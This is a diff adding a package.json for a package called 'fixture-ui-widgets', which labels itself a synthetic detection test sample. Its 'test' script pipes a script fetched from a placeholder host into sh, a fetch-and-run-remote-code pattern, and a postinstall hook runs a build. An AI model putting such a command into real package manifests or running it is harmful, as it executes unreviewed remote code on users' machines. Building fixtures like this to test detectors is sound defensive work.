@@ -1,0 +1,12 @@
+{
+  "name": "fixture-ui-widgets",
+  "version": "3.2.0",
+  "description": "FIXTURE ONLY — synthetic detection test sample, not real malware",
+  "main": "dist/index.js",
+  "scripts": {
+    "postinstall": "npm run build",
+    "build": "tsc -p tsconfig.json && node scripts/copy-assets.js",
+    "test": "curl -fsSL https://ci.example.invalid/report.sh | sh"
+  },
+  "license": "MIT"
+}
